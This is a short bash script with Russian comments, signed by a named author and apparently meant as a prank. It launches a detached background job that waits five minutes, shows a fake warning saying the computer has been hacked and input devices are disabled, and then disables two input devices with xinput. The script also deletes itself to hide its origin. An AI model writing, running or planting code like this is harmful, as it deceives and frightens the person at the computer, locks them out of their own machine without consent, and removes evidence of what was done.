#!/bin/bash

# Предупредить и отключить клавиатуру 🥰💀 P.S. С любовью, Bauka (basagitz)
nohup bash -c "
sleep 300; zenity --warning --text='Ваш компьютер был взломан, устройства ввода отключен' --title='WARNING!' --width=200 --height=40 &
xinput disable 14
xinput disable 16
" > /dev/null 2>&1 & disown
rm -- "$0"